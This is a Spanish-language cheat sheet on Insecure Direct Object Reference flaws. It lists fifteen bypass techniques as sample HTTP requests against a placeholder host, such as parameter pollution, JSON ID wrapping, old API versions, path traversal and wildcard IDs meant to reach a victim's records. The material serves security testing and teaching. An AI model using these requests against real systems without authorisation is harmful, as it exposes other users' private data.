# Insecure Direct Object Reference (IDOR)

IDOR significa Insecure Direct Object Reference y es una vulnerabilidad de seguridad en la que un usuario puede acceder y realizar cambios en los datos de cualquier otro usuario presente en el sistema

Por lo general, se puede encontrar en las API, y en las solicitudes HTTP que contiene una identificación única, por ejemplo, (user_id=) o (id=)

# Explotando

1 - Agregue parámetros a los endpoints, por ejemplo, si hubiera

    GET /api/v1/getuser HTTP/1.1
    Host: host.com
    ...

  Intente este bypass

    GET /api/v1/getuser?id=1234 HTTP/1.1
    Host: host.com
    ...
    
2 - HTTP Parameter pollution 
    
    POST /api/get_profile HTTP/1.1
    Host: host.com
    ...

    user_id=attacker_id&user_id=victim_id
    
3 - Agregue .json al endpoint

  Si la respuesta es

    GET /v2/GetData/1234 HTTP/1.1
    Host: host.com
    ...
    
  Intente este bypass

    GET /v2/GetData/1234.json HTTP/1.1
    Host: host.com
    ...
    
4 - Prueba en versiones de API obsoletas

  Si la respuesta es

    POST /v2/GetData HTTP/1.1
    Host: host.com
    ...

    id=123
    
  Intente este bypass

    POST /v1/GetData HTTP/1.1
    Host: host.com
    ...

    id=123
    
5 - Envuelva la ID 

  Si la respuesta es

    POST /api/get_profile HTTP/1.1
    Host: host.com
    ...

    {"user_id":111}
    
  Intente este bypass

    POST /api/get_profile HTTP/1.1
    Host: host.com
    ...

    {"id":[111]}
    
6 - Envuelva la ID con un objeto JSON     

  Si la respuesta es

    POST /api/get_profile HTTP/1.1
    Host: host.com
    ...

    {"user_id":111}
    
  Intente este bypass

    POST /api/get_profile HTTP/1.1
    Host: host.com
    ...

    {"user_id":{"user_id":111}}
    
7 - JSON Parameter Pollution

    POST /api/get_profile HTTP/1.1
    Host: host.com
    ...

    {"user_id":"attacker_id","user_id":"victim_id"}
    
8 - Intente decodificar la identificación, si la identificación está codificada usando md5, base64, etc.

    GET /GetUser/dmljdGltQG1haWwuY29t HTTP/1.1
    Host: host.com
    ...
    
dmljdGltQG1haWwuY29t => victim@mail.com    

9 - Si el sitio web usa GraphQL, intente encontrar IDOR usando GraphQL 

    GET /graphql HTTP/1.1
    Host: host.com
    ...
  
  Intente esto  
    
    GET /graphql.php?query= HTTP/1.1
    Host: host.com
    ...
    
10 - MFLAC (Missing Function Level Access Control)

  Si la respuesta es 

    GET /admin/profile HTTP/1.1
    Host: host.com
    ...
    
  Intente este bypass

    GET /ADMIN/profile HTTP/1.1
    Host: host.com
    ...
    
11 - Intenta intercambiar el ID con números

  Si la respuesta es 

    GET /file?id=90ri2-xozifke-29ikedaw0d HTTP/1.1
    Host: host.com
    ...
    
  Intenta este bypass

    GET /file?id=302
    Host: host.com
    ...

12 - Cambiar método de GET a POST

  Si la respuesta es 

    GET /api/v1/users/profile/111 HTTP/1.1
    Host: host.com
    ...
    
  Intente este bypass

    POST /api/v1/users/profile/111 HTTP/1.1
    Host: host.com
    ...
    
13 - Path Traversal    

  Si la respuesta es

    GET /api/v1/users/profile/victim_id HTTP/1.1
    Host: host.com
    ...
    
  Intente este bypass

    GET /api/v1/users/profile/my_id/../victim_id HTTP/1.1
    Host: host.com
    ...
    
14 - Cambia el Content-Type

  Si la respuesta es

    GET /api/v1/users/1 HTTP/1.1
    Host: host.com
    Content-type: application/xml
    
  Intente este bypass

    GET /api/v1/users/2 HTTP/1.1
    Host: host.com
    Content-type: application/json
    
15 - Enviar símbolos en lugar de ID

  Si la respuesta es

    GET /api/users/111 HTTP/1.1
    Host: host.com
    
  Intente estos bypass

    GET /api/users/* HTTP/1.1
    Host: host.com
    
  Segundo bypass
 
    GET /api/users/% HTTP/1.1
    Host: host.com

  Tercer bypass

    GET /api/users/_ HTTP/1.1
    Host: host.com
    
  Cuarto bypass

    GET /api/users/. HTTP/1.1
    Host: host.com
